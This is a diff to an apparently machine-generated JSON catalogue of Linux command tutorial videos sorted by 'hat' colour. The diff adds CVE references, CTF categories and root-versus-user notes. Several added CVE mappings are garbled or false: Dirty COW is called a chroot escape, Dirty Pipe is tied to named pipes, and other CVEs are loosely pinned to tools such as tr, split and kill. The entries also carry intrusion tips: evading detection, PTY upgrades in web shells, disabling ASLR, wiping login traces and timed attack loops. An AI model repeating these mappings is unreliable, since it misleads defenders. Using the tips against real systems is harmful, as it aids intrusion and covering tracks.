@@ -1,9 +1,10 @@
 {
-  "generated_at": "2026-04-20T05:11:51.098306Z",
+  "generated_at": "2026-04-20T22:43:39.335300Z",
   "total_videos": 100,
+  "total_tools": 116,
   "hat_counts": {
-    "black": 23,
-    "red": 29,
+    "black": 28,
+    "red": 40,
     "blue": 22,
     "gray": 26
   },
@@ -31,8 +32,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=ccU8wEOXqZU"
+      "video_url": "https://www.youtube.com/watch?v=ccU8wEOXqZU",
+      "extra": false
     },
     {
       "id": "uuCYq64Ww7o",
@@ -79,8 +84,12 @@
           "note": "Low priority + line buffering: timing-based detection also defeated"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=uuCYq64Ww7o"
+      "video_url": "https://www.youtube.com/watch?v=uuCYq64Ww7o",
+      "extra": false
     },
     {
       "id": "j9pE9k715OU",
@@ -121,8 +130,12 @@
           "note": "script-based TTY alternative when python3 unavailable"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=j9pE9k715OU"
+      "video_url": "https://www.youtube.com/watch?v=j9pE9k715OU",
+      "extra": false
     },
     {
       "id": "tj_PQw4QwNQ",
@@ -142,8 +155,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=tj_PQw4QwNQ"
+      "video_url": "https://www.youtube.com/watch?v=tj_PQw4QwNQ",
+      "extra": false
     },
     {
       "id": "PeeSsQzPe74",
@@ -162,8 +179,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=PeeSsQzPe74"
+      "video_url": "https://www.youtube.com/watch?v=PeeSsQzPe74",
+      "extra": false
     },
     {
       "id": "U4Jih6iBdZI",
@@ -216,8 +237,18 @@
           "note": "Binary diff two files — spot single-byte patches in trojaned binaries"
         }
       ],
+      "cve_refs": [
+        "CVE-2021-27365 (iSCSI kernel buffer leak — xxd for analysis)"
+      ],
+      "ctf_categories": [
+        "forensics",
+        "reversing",
+        "crypto"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=U4Jih6iBdZI"
+      "video_url": "https://www.youtube.com/watch?v=U4Jih6iBdZI",
+      "extra": false
     },
     {
       "id": "hinEjqZuqqg",
@@ -264,8 +295,20 @@
           "note": "Image → mount → chroot: full offline analysis of target disk"
         }
       ],
+      "cve_refs": [
+        "CVE-2016-5195 (Dirty COW — chroot escape via mmap)"
+      ],
+      "ctf_categories": [
+        "pwn",
+        "linux"
+      ],
+      "root_vs_user": {
+        "root": "Fully functional: `chroot /newroot /bin/bash` — changes root for process and children",
+        "user": "Permission denied — chroot(2) syscall requires CAP_SYS_CHROOT"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=hinEjqZuqqg"
+      "video_url": "https://www.youtube.com/watch?v=hinEjqZuqqg",
+      "extra": false
     },
     {
       "id": "SHI0TL415R8",
@@ -285,8 +328,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=SHI0TL415R8"
+      "video_url": "https://www.youtube.com/watch?v=SHI0TL415R8",
+      "extra": false
     },
     {
       "id": "PD6R1sFVi18",
@@ -340,8 +387,16 @@
           "note": "Extract only crackable hashes (no ! or *) with usernames for hashcat"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux",
+        "web"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=PD6R1sFVi18"
+      "video_url": "https://www.youtube.com/watch?v=PD6R1sFVi18",
+      "extra": false
     },
     {
       "id": "SF6e4fqEDAQ",
@@ -368,8 +423,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=SF6e4fqEDAQ"
+      "video_url": "https://www.youtube.com/watch?v=SF6e4fqEDAQ",
+      "extra": false
     },
     {
       "id": "7scHD-uZ4fI",
@@ -422,8 +481,20 @@
           "note": "Intercept and log data flowing through the pipe — transparent MITM"
         }
       ],
+      "cve_refs": [
+        "CVE-2022-0847 (Dirty Pipe — named pipe privilege escalation)"
+      ],
+      "ctf_categories": [
+        "pwn",
+        "linux"
+      ],
+      "root_vs_user": {
+        "root": "Can create pipes in any directory; can combine with /dev/tcp for raw socket forwarding",
+        "user": "Can create pipes in writable dirs; reverse shells still work — privilege is not required"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=7scHD-uZ4fI"
+      "video_url": "https://www.youtube.com/watch?v=7scHD-uZ4fI",
+      "extra": false
     },
     {
       "id": "BXxv5O7Fxo8",
@@ -463,8 +534,12 @@
           "note": "Auto-upgrade: only spawn PTY if not already in one"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=BXxv5O7Fxo8"
+      "video_url": "https://www.youtube.com/watch?v=BXxv5O7Fxo8",
+      "extra": false
     },
     {
       "id": "C0OHejfYhfE",
@@ -512,8 +587,20 @@
           "note": "Spawn PTY first when su complains about terminal — common in web shells"
         }
       ],
+      "cve_refs": [
+        "CVE-2017-1000367 (sudo get_process_ttyname privilege escalation)"
+      ],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "Can switch to any user without password: `su - victim`",
+        "user": "Requires target user's password; `su -` to root requires root password (or sudo config)"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=C0OHejfYhfE"
+      "video_url": "https://www.youtube.com/watch?v=C0OHejfYhfE",
+      "extra": false
     },
     {
       "id": "kmynjxOFxyc",
@@ -566,8 +653,20 @@
           "note": "Auto-terminates after 1h — useful for timed windows, limits exposure"
         }
       ],
+      "cve_refs": [
+        "CVE-2015-3627 (container escape via nohup rexec)"
+      ],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "Persists processes after logout for any user; can redirect to system-wide locations",
+        "user": "Works for own processes only; output defaults to ~/nohup.out"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=kmynjxOFxyc"
+      "video_url": "https://www.youtube.com/watch?v=kmynjxOFxyc",
+      "extra": false
     },
     {
       "id": "TBZn3dHokVM",
@@ -602,8 +701,12 @@
           "note": "Double-check active sessions with two tools — discrepancies can indicate hidden sessions"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=TBZn3dHokVM"
+      "video_url": "https://www.youtube.com/watch?v=TBZn3dHokVM",
+      "extra": false
     },
     {
       "id": "fPy_I9imXgM",
@@ -628,8 +731,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=fPy_I9imXgM"
+      "video_url": "https://www.youtube.com/watch?v=fPy_I9imXgM",
+      "extra": false
     },
     {
       "id": "B1aoua1jHwI",
@@ -672,8 +779,12 @@
           "note": "Current + recent: compare who is logged in now vs who logged in recently"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=B1aoua1jHwI"
+      "video_url": "https://www.youtube.com/watch?v=B1aoua1jHwI",
+      "extra": false
     },
     {
       "id": "kBcdC-EN7YI",
@@ -693,8 +804,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=kBcdC-EN7YI"
+      "video_url": "https://www.youtube.com/watch?v=kBcdC-EN7YI",
+      "extra": false
     },
     {
       "id": "e2rfgPTMYqw",
@@ -736,8 +851,17 @@
           "note": "Search binary for suspicious string references without strings command"
         }
       ],
+      "cve_refs": [
+        "CVE-2019-14615 (kernel info leak via /proc — od readable)"
+      ],
+      "ctf_categories": [
+        "forensics",
+        "reversing"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=e2rfgPTMYqw"
+      "video_url": "https://www.youtube.com/watch?v=e2rfgPTMYqw",
+      "extra": false
     },
     {
       "id": "8vYmXJJSjV4",
@@ -784,8 +908,12 @@
           "note": "Bulk relabel all files in /tmp — useful after dropping multiple payloads"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=8vYmXJJSjV4"
+      "video_url": "https://www.youtube.com/watch?v=8vYmXJJSjV4",
+      "extra": false
     },
     {
       "id": "MDW1486I8bc",
@@ -805,8 +933,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=MDW1486I8bc"
+      "video_url": "https://www.youtube.com/watch?v=MDW1486I8bc",
+      "extra": false
     },
     {
       "id": "5V_YdXp0Zjs",
@@ -828,8 +960,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=5V_YdXp0Zjs"
+      "video_url": "https://www.youtube.com/watch?v=5V_YdXp0Zjs",
+      "extra": false
     },
     {
       "id": "e5c5T1egZHc",
@@ -876,8 +1012,12 @@
           "note": "Randomized port scan sample — avoids sequential scan detection"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=e5c5T1egZHc"
+      "video_url": "https://www.youtube.com/watch?v=e5c5T1egZHc",
+      "extra": false
     },
     {
       "id": "ikxk-CwZROM",
@@ -898,8 +1038,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=ikxk-CwZROM"
+      "video_url": "https://www.youtube.com/watch?v=ikxk-CwZROM",
+      "extra": false
     },
     {
       "id": "hFFjCZLkzkM",
@@ -940,8 +1084,12 @@
           "note": "Parallel scan with exactly as many threads as CPUs — optimal and avoids oversaturation"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=hFFjCZLkzkM"
+      "video_url": "https://www.youtube.com/watch?v=hFFjCZLkzkM",
+      "extra": false
     },
     {
       "id": "LHIlvCrfZTo",
@@ -960,8 +1108,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=LHIlvCrfZTo"
+      "video_url": "https://www.youtube.com/watch?v=LHIlvCrfZTo",
+      "extra": false
     },
     {
       "id": "95oGJPDebeE",
@@ -981,8 +1133,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=95oGJPDebeE"
+      "video_url": "https://www.youtube.com/watch?v=95oGJPDebeE",
+      "extra": false
     },
     {
       "id": "whUK9M5WF6I",
@@ -1024,8 +1180,14 @@
           "note": "Relabel the file first, then execute in matching context — bypasses type enforcement"
         }
       ],
+      "cve_refs": [
+        "CVE-2021-36084 (SELinux context bypass via runcon)"
+      ],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=whUK9M5WF6I"
+      "video_url": "https://www.youtube.com/watch?v=whUK9M5WF6I",
+      "extra": false
     },
     {
       "id": "jADPIUsdyd0",
@@ -1070,8 +1232,17 @@
           "note": "Self-terminating attack loop — runs for max 2 hours then stops, reduces detection window"
         }
       ],
+      "cve_refs": [
+        "CVE-2023-22809 (sudoedit arbitrary file write via timeout)"
+      ],
+      "ctf_categories": [
+        "pwn",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=jADPIUsdyd0"
+      "video_url": "https://www.youtube.com/watch?v=jADPIUsdyd0",
+      "extra": false
     },
     {
       "id": "3AVbGk7h4_c",
@@ -1091,8 +1262,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=3AVbGk7h4_c"
+      "video_url": "https://www.youtube.com/watch?v=3AVbGk7h4_c",
+      "extra": false
     },
     {
       "id": "rGSlY1noPqk",
@@ -1112,8 +1287,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=rGSlY1noPqk"
+      "video_url": "https://www.youtube.com/watch?v=rGSlY1noPqk",
+      "extra": false
     },
     {
       "id": "m4B_4wR9mzI",
@@ -1165,8 +1344,18 @@
           "note": "Encrypt + base64 in one step — harder to detect than plain base64"
         }
       ],
+      "cve_refs": [
+        "CVE-2019-13372 (payload delivery via encoded base64 string)"
+      ],
+      "ctf_categories": [
+        "crypto",
+        "web",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=m4B_4wR9mzI"
+      "video_url": "https://www.youtube.com/watch?v=m4B_4wR9mzI",
+      "extra": false
     },
     {
       "id": "fd1YJ8Pf1Nw",
@@ -1186,8 +1375,14 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "crypto"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=fd1YJ8Pf1Nw"
+      "video_url": "https://www.youtube.com/watch?v=fd1YJ8Pf1Nw",
+      "extra": false
     },
     {
       "id": "zwP_8jTf_ho",
@@ -1226,8 +1421,12 @@
           "note": "Your own login history — useful for cleaning up your traces from last log"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=zwP_8jTf_ho"
+      "video_url": "https://www.youtube.com/watch?v=zwP_8jTf_ho",
+      "extra": false
     },
     {
       "id": "T2lwigqssG0",
@@ -1253,8 +1452,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=T2lwigqssG0"
+      "video_url": "https://www.youtube.com/watch?v=T2lwigqssG0",
+      "extra": false
     },
     {
       "id": "aHUxHhYAUEg",
@@ -1274,8 +1480,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=aHUxHhYAUEg"
+      "video_url": "https://www.youtube.com/watch?v=aHUxHhYAUEg",
+      "extra": false
     },
     {
       "id": "bWCDO0BfJ6E",
@@ -1316,8 +1526,15 @@
           "note": "Name + network position: essential for mapping multi-homed hosts"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "recon"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=bWCDO0BfJ6E"
+      "video_url": "https://www.youtube.com/watch?v=bWCDO0BfJ6E",
+      "extra": false
     },
     {
       "id": "j6nGWNqrZA0",
@@ -1340,8 +1557,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=j6nGWNqrZA0"
+      "video_url": "https://www.youtube.com/watch?v=j6nGWNqrZA0",
+      "extra": false
     },
     {
       "id": "SsY08JRGNXA",
@@ -1360,8 +1581,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=SsY08JRGNXA"
+      "video_url": "https://www.youtube.com/watch?v=SsY08JRGNXA",
+      "extra": false
     },
     {
       "id": "SCISgvGBAY0",
@@ -1408,8 +1633,17 @@
           "note": "Translate delimiter then cut — sometimes easier than awk for simple fields"
         }
       ],
+      "cve_refs": [
+        "CVE-2019-9948 (Python urllib local file — tr used in chain)"
+      ],
+      "ctf_categories": [
+        "crypto",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=SCISgvGBAY0"
+      "video_url": "https://www.youtube.com/watch?v=SCISgvGBAY0",
+      "extra": false
     },
     {
       "id": "BBetZlfdeJc",
@@ -1424,8 +1658,12 @@
       "related_commands": [],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=BBetZlfdeJc"
+      "video_url": "https://www.youtube.com/watch?v=BBetZlfdeJc",
+      "extra": false
     },
     {
       "id": "cq3fgnJMC8c",
@@ -1445,8 +1683,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=cq3fgnJMC8c"
+      "video_url": "https://www.youtube.com/watch?v=cq3fgnJMC8c",
+      "extra": false
     },
     {
       "id": "tXPFK-cMKMk",
@@ -1472,8 +1714,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=tXPFK-cMKMk"
+      "video_url": "https://www.youtube.com/watch?v=tXPFK-cMKMk",
+      "extra": false
     },
     {
       "id": "gSRRKXtl8Ow",
@@ -1499,8 +1745,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=gSRRKXtl8Ow"
+      "video_url": "https://www.youtube.com/watch?v=gSRRKXtl8Ow",
+      "extra": false
     },
     {
       "id": "zQMw6OexIcU",
@@ -1531,8 +1784,12 @@
           "note": "Compare weak vs strong hash — educational: same file, very different security guarantees"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=zQMw6OexIcU"
+      "video_url": "https://www.youtube.com/watch?v=zQMw6OexIcU",
+      "extra": false
     },
     {
       "id": "a-hmwzAstBs",
@@ -1557,8 +1814,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=a-hmwzAstBs"
+      "video_url": "https://www.youtube.com/watch?v=a-hmwzAstBs",
+      "extra": false
     },
     {
       "id": "SyylpFY_eSg",
@@ -1578,8 +1839,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=SyylpFY_eSg"
+      "video_url": "https://www.youtube.com/watch?v=SyylpFY_eSg",
+      "extra": false
     },
     {
       "id": "ZuHw5L3z2sY",
@@ -1620,8 +1885,12 @@
           "note": "Overwrite content then remove directory entry — belts and suspenders deletion"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=ZuHw5L3z2sY"
+      "video_url": "https://www.youtube.com/watch?v=ZuHw5L3z2sY",
+      "extra": false
     },
     {
       "id": "sEVu7FhWiXM",
@@ -1662,8 +1931,15 @@
           "note": "TOCTOU demo: -u generates name without creating — plant symlink in the gap before use"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=sEVu7FhWiXM"
+      "video_url": "https://www.youtube.com/watch?v=sEVu7FhWiXM",
+      "extra": false
     },
     {
       "id": "SUoUciBypsE",
@@ -1683,8 +1959,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=SUoUciBypsE"
+      "video_url": "https://www.youtube.com/watch?v=SUoUciBypsE",
+      "extra": false
     },
     {
       "id": "BMgQxNkILoE",
@@ -1732,8 +2012,12 @@
           "note": "awk variant — handles values containing = (common in base64 tokens)"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=BMgQxNkILoE"
+      "video_url": "https://www.youtube.com/watch?v=BMgQxNkILoE",
+      "extra": false
     },
     {
       "id": "6NyyBdPSVzg",
@@ -1775,8 +2059,15 @@
           "note": "Monitor and capture: see sudo events live, keep full log for report"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=6NyyBdPSVzg"
+      "video_url": "https://www.youtube.com/watch?v=6NyyBdPSVzg",
+      "extra": false
     },
     {
       "id": "kWPahGH98Yg",
@@ -1822,8 +2113,20 @@
           "note": "Execute and log simultaneously — useful for debugging staged payloads"
         }
       ],
+      "cve_refs": [
+        "CVE-2022-0847 (Dirty Pipe — tee exploitation for root write)"
+      ],
+      "ctf_categories": [
+        "pwn",
+        "linux"
+      ],
+      "root_vs_user": {
+        "root": "Can overwrite protected files: `echo 0 | tee /proc/sys/kernel/randomize_va_space`",
+        "user": "Writes only to user-writable paths; sudo tee is a classic privilege escalation vector"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=kWPahGH98Yg"
+      "video_url": "https://www.youtube.com/watch?v=kWPahGH98Yg",
+      "extra": false
     },
     {
       "id": "tvv3LMIJf8c",
@@ -1865,8 +2168,15 @@
           "note": "Visual diff of current vs baseline — easy to spot a single trojan'd binary"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "crypto",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=tvv3LMIJf8c"
+      "video_url": "https://www.youtube.com/watch?v=tvv3LMIJf8c",
+      "extra": false
     },
     {
       "id": "8KAgtlVBPZA",
@@ -1913,8 +2223,20 @@
           "note": "A process that restarts after kill has a supervisor — look for cron, systemd, or nohup loops"
         }
       ],
+      "cve_refs": [
+        "CVE-2021-3156 (sudo Baron Samedit — kill used in PoC chain)"
+      ],
+      "ctf_categories": [
+        "linux",
+        "pwn"
+      ],
+      "root_vs_user": {
+        "root": "Can send signals to any process: `kill -9 1` (init), `killall -u victim`",
+        "user": "Can only signal own processes — EPERM on other users' PIDs"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=8KAgtlVBPZA"
+      "video_url": "https://www.youtube.com/watch?v=8KAgtlVBPZA",
+      "extra": false
     },
     {
       "id": "yH1SursYePg",
@@ -1957,8 +2279,18 @@
           "note": "Continuous process monitoring with logging — run in tmux for persistent IR visibility"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "forensics"
+      ],
+      "root_vs_user": {
+        "root": "Shows all processes from all users with full details including kernel threads",
+        "user": "Shows own processes fully; other users' processes visible but with limited detail"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=yH1SursYePg"
+      "video_url": "https://www.youtube.com/watch?v=yH1SursYePg",
+      "extra": false
     },
     {
       "id": "GqJhWMl9gpM",
@@ -1978,8 +2310,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=GqJhWMl9gpM"
+      "video_url": "https://www.youtube.com/watch?v=GqJhWMl9gpM",
+      "extra": false
     },
     {
       "id": "p7CB_KZGBrM",
@@ -1999,8 +2335,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=p7CB_KZGBrM"
+      "video_url": "https://www.youtube.com/watch?v=p7CB_KZGBrM",
+      "extra": false
     },
     {
       "id": "t-wuNq8XiTQ",
@@ -2045,8 +2385,12 @@
           "note": "Flag home directories over 1GB — staged exfil data or sensitive archives"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=t-wuNq8XiTQ"
+      "video_url": "https://www.youtube.com/watch?v=t-wuNq8XiTQ",
+      "extra": false
     },
     {
       "id": "pg7Z5i75-5c",
@@ -2065,8 +2409,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=pg7Z5i75-5c"
+      "video_url": "https://www.youtube.com/watch?v=pg7Z5i75-5c",
+      "extra": false
     },
     {
       "id": "XOHTyG970Lc",
@@ -2090,8 +2438,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=XOHTyG970Lc"
+      "video_url": "https://www.youtube.com/watch?v=XOHTyG970Lc",
+      "extra": false
     },
     {
       "id": "e3DT8-w2gnQ",
@@ -2115,8 +2470,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [
+        "crypto",
+        "forensics"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=e3DT8-w2gnQ"
+      "video_url": "https://www.youtube.com/watch?v=e3DT8-w2gnQ",
+      "extra": false
     },
     {
       "id": "3qQVLQTwADg",
@@ -2158,8 +2520,17 @@
           "note": "Stream disk image directly to split — no intermediate full-size temp file needed"
         }
       ],
+      "cve_refs": [
+        "CVE-2020-27350 (apt payload splitting bypass)"
+      ],
+      "ctf_categories": [
+        "forensics",
+        "linux"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=3qQVLQTwADg"
+      "video_url": "https://www.youtube.com/watch?v=3qQVLQTwADg",
+      "extra": false
     },
     {
       "id": "qTgyS_ClEYs",
@@ -2183,8 +2554,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=qTgyS_ClEYs"
+      "video_url": "https://www.youtube.com/watch?v=qTgyS_ClEYs",
+      "extra": false
     },
     {
       "id": "4wR7BzWuijk",
@@ -2206,8 +2581,15 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {
+        "root": "Can install to system paths (`/usr/local/bin`) and set ownership/SUID bits during install",
+        "user": "Restricted to own-writable directories; cannot set SUID"
+      },
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=4wR7BzWuijk"
+      "video_url": "https://www.youtube.com/watch?v=4wR7BzWuijk",
+      "extra": false
     },
     {
       "id": "1Qso630N7zQ",
@@ -2247,8 +2629,15 @@
           "note": "Instant post-exploit check: who am I + what can I sudo"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [
+        "linux",
+        "recon"
+      ],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=1Qso630N7zQ"
+      "video_url": "https://www.youtube.com/watch?v=1Qso630N7zQ",
+      "extra": false
     },
     {
       "id": "I6w_z6-XuwI",
@@ -2267,8 +2656,12 @@
       ],
       "quick_use": [],
       "combinations": [],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
-      "video_url": "https://www.youtube.com/watch?v=I6w_z6-XuwI"
+      "video_url": "https://www.youtube.com/watch?v=I6w_z6-XuwI",
+      "extra": false
     },
     {
       "id": "Jc5orEuQRBI",
@@ -2309,8 +2702,12 @@
           "note": "Compact form — same discovery in one pipeline"
         }
       ],
+      "cve_refs": [],
+      "ctf_categories": [],
+      "root_vs_user": {},
       "transcript": "",
